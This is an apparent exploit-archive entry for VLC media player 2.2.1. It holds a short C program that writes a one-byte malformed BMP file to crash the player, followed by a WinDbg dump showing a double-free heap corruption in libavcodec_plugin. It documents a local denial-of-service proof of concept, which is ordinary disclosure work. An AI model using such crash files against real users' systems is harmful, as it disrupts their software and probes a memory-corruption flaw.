@@ -1,0 +1,145 @@
+id: 24295
+date: 09/25/2015
+title: VLC media player 2.2.1 heap corruption Exploit
+author: st4n
+cves: 
+
+/*
+    **** VLC media player 2.2.1 poc crash ****
+
+    Author : st4n
+    Vendor link : http://www.videolan.org/vlc/
+    Discovered : 21.08.2015
+    Version : 2.2.1 
+    Category : Local-DOS
+    Tested On : Windows 8.1 x64
+*/
+
+#define _CRT_SECURE_NO_WARNINGS 1
+#include <stdio.h>
+
+unsigned char poc_crash[] = { 0x92 };
+
+int main(int argc, char** argv){
+	FILE* f = NULL;
+	f = fopen("poc.bmp", "wb");
+	fwrite(poc_crash, sizeof(poc_crash), 1, f);
+	fclose(f);
+	puts("\n[*] POC written to poc.bmp");
+	return 0;
+}
+
+/*
+    Windbg Output:
+
+
+	FAULTING_IP:
+	ntdll!RtlReportCriticalFailure+46
+	77a055e7 cc              int     3
+
+	EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
+	ExceptionAddress: 77a055e7 (ntdll!RtlReportCriticalFailure+0x00000046)
+	ExceptionCode: 80000003 (Break instruction exception)
+	ExceptionFlags: 00000000
+	NumberParameters: 1
+	Parameter[0]: 00000000
+
+	CONTEXT:  00000000 -- (.cxr 0x0;r)
+	eax=00000000 ebx=00000000 ecx=c0000374 edx=00000021 esi=00000002 edi=0375b3c0
+	eip=77a055e7 esp=06a0f7a8 ebp=06a0f838 iopl=0         nv up ei pl zr na pe nc
+	cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000244
+	ntdll!RtlReportCriticalFailure+0x46:
+	77a055e7 cc              int     3
+
+	FAULTING_THREAD:  00002e94
+
+	PROCESS_NAME:  image00400000
+
+	ERROR_CODE: (NTSTATUS) 0x80000003 - {EXCEPTION}  Breakpoint  A breakpoint has been reached.
+
+	EXCEPTION_CODE: (HRESULT) 0x80000003 (2147483651) - One or more arguments are invalid
+
+	EXCEPTION_PARAMETER1:  00000000
+
+	NTGLOBALFLAG:  0
+
+	APPLICATION_VERIFIER_FLAGS:  0
+
+	APP:  image00400000
+
+	ANALYSIS_VERSION: 6.3.9600.17237 (debuggers(dbg).140716-0327) x86fre
+
+	LAST_CONTROL_TRANSFER:  from 77a08188 to 77a055e7
+
+	BUGCHECK_STR:  APPLICATION_FAULT_ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy_DOUBLE_FREE
+
+	PRIMARY_PROBLEM_CLASS:  ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy
+
+	DEFAULT_BUCKET_ID:  ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy
+
+	STACK_TEXT:
+	77a213b0 779a66c4 ntdll!RtlFreeHeap+0x449d4
+	77a213b4 773ab0f9 msvcrt!free+0x65
+	77a213b8 50c41b06 libavcodec_plugin!vlc_entry_license__2_2_0b+0x27b36
+
+
+	FOLLOWUP_IP:
+	libavcodec_plugin!vlc_entry_license__2_2_0b+27b36
+	50c41b06 8b442424        mov     eax,dword ptr [esp+24h]
+
+	SYMBOL_STACK_INDEX:  2
+
+	SYMBOL_NAME:  libavcodec_plugin!vlc_entry_license__2_2_0b+27b36
+
+	FOLLOWUP_NAME:  MachineOwner
+
+	MODULE_NAME: libavcodec_plugin
+
+	IMAGE_NAME:  libavcodec_plugin.dll
+
+	DEBUG_FLR_IMAGE_TIMESTAMP:  20002
+
+	STACK_COMMAND:  dps 77a213b0 ; kb
+
+	FAILURE_BUCKET_ID:  ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy_80000003_libavcodec_plugin.dll!vlc_entry_license__2_2_0b
+
+	BUCKET_ID:  APPLICATION_FAULT_ACTIONABLE_HEAP_CORRUPTION_heap_failure_block_not_busy_DOUBLE_FREE_libavcodec_plugin!vlc_entry_license__2_2_0b+27b36
+
+	ANALYSIS_SOURCE:  UM
+
+	FAILURE_ID_HASH_STRING:  um:actionable_heap_corruption_heap_failure_block_not_busy_80000003_libavcodec_plugin.dll!vlc_entry_license__2_2_0b
+
+	FAILURE_ID_HASH:  {e6576752-f1bc-3c18-23bd-466ae180659d}
+
+	Followup: MachineOwner
+	---------
+
+	ChildEBP RetAddr  Args to Child
+	06a0f838 77a08188 004f0000 00000002 06a0f878 ntdll!RtlReportCriticalFailure+0x46
+	06a0f848 77a08a39 332d0002 0375b3c0 004f0000 ntdll!RtlpHeapHandleError+0x1c
+	06a0f878 779a66c4 0375b3c0 00000000 00000000 ntdll!RtlpLogHeapFailure+0xa1
+	06a0f8d0 773ab0f9 004f0000 00000000 0375b3c8 ntdll!RtlFreeHeap+0x449d4
+	06a0f91c 50c41b06 0375b3c8 00000001 00008000 msvcrt!free+0x65
+	WARNING: Stack unwind information not available. Following frames may be wrong.
+	06a0f92c 773ab197 004f0000 037633f8 00000001 libavcodec_plugin!vlc_entry_license__2_2_0b+0x27b36
+	06a0f9fc 515a1bf0 000000a8 036cfc40 06a0fc6c msvcrt!malloc+0x90
+	06a0fa4c 50c1ff0c 036cfc4c 037282c8 51624f60 libavcodec_plugin!vlc_entry_license__2_2_0b+0x987c20
+	06a0fc6c 543e23b0 037145ec 06a0fd38 00000000 libavcodec_plugin!vlc_entry_license__2_2_0b+0x5f3c
+	06a0fcec 543aedd4 02bfdb54 544cc83e 544caa8f libvlccore!picture_pool_GetSize+0x60
+	06a0fd00 773ab0f9 004f0000 00000000 037145ec libvlccore!input_resource_Terminate+0x1c94
+	06a0fd4c 54394d13 037145ec 544caa4a 036c8220 msvcrt!free+0x65
+	06a0fd8c 543b24b1 0055cb34 00000101 06a0fdbc libvlccore!decoder_SynchroNewPicture+0x9b3
+	06a0fdac 543a4273 02bfdb54 02bfdb54 037113a8 libvlccore!stream_Control+0x21
+	06a0fe2c 543a1a80 02bfdb54 544cc684 00000030 libvlccore!demux_PacketizerDestroy+0xed13
+	06a0fe4c 543ad25f 06a0fe34 00000000 00000000 libvlccore!demux_PacketizerDestroy+0xc520
+	06a0fe6c 543a5490 00000000 00000000 00000000 libvlccore!input_resource_Terminate+0x11f
+	06a0fedc 544035dc 00000000 00000000 00000000 libvlccore!demux_PacketizerDestroy+0xff30
+	06a0ff78 773b80f5 06a0ff94 76e07c04 03720d20 libvlccore!vlc_savecancel+0x2c
+	06a0ff80 76e07c04 03720d20 76e07be0 32601a7e msvcrt!_threadstartex+0x61
+	06a0ff94 7797ad1f 03720d20 332d07a6 00000000 KERNEL32!BaseThreadInitThunk+0x24
+	06a0ffdc 7797acea ffffffff 7796023a 00000000 ntdll!__RtlUserThreadStart+0x2f
+	06a0ffec 00000000 773b80b0 03720d20 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+*/
+
+#  0day.today [2023-03-23]  #
